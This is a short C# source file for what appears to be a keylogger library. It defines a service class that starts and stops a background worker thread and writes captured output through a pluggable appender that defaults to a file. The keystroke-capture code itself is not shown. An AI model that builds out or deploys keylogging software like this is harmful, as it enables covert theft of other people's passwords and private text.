using KeyLogger.Library.Helpers;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using KeyLogger.Library.Appenders;
using System.Threading;
using KeyLogger.Library.Worker;

namespace KeyLogger.Library
{
    public class KeyLoggerService : IKeyLoggerService
    {
        private readonly KeyLoggerWorker _keyLoggerWorker;
        private readonly Thread _workerThread; 
        private IOutputAppender _outputAppender;

        public KeyLoggerService()
        {
            _outputAppender = new FileAppender();
            _keyLoggerWorker = new KeyLoggerWorker();
            _workerThread = new Thread(_keyLoggerWorker.DoWork);
        }

        public IOutputAppender SetOutputMode
        {
            set
            {
                _outputAppender = value;
            }
        }

        public void Start()
        {
            _workerThread.Start(_outputAppender);
        }

        public void Stop()
        {
            // Request that the worker thread stop itself:
            _keyLoggerWorker.RequestStop();
            _workerThread.Join();
        }
    }
}
